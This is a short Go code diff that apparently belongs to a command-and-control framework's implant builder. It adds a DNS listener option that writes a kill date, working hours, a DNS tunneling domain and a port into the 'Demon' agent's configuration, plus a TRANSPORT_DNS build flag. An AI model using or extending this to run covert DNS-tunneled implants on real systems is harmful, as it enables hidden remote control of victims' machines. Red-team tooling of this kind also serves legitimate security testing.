@@ -1014,6 +1014,31 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		DemonConfig.AddInt32(WorkingHours)
 
 		break
+
+	case handlers.LISTENER_DNS:
+		var Config = b.config.ListenerConfig.(*handlers.DNS)
+
+		DemonConfig.AddInt64(Config.Config.KillDate)
+
+		WorkingHours, err := common.ParseWorkingHours(Config.Config.WorkingHours)
+		if err != nil {
+			logger.Error("Failed to parse the WorkingHours: " + err.Error())
+			return nil, err
+		}
+
+		DemonConfig.AddInt32(WorkingHours)
+
+		// Domain for DNS tunneling
+		DemonConfig.AddString(Config.Config.Domain)
+
+		// DNS port
+		Port, err := strconv.Atoi(Config.Config.PortBind)
+		if err != nil {
+			Port = 53
+		}
+		DemonConfig.AddInt(Port)
+
+		break
 	}
 
 	//logger.Debug("DemonConfig:\n" + hex.Dump(DemonConfig.Buffer()))
@@ -1112,6 +1137,11 @@ func (b *Builder) GetListenerDefines() []string {
 	case handlers.LISTENER_PIVOT_SMB:
 
 		defines = append(defines, "TRANSPORT_SMB")
+		break
+
+	case handlers.LISTENER_DNS:
+
+		defines = append(defines, "TRANSPORT_DNS")
 		break
 
 	}
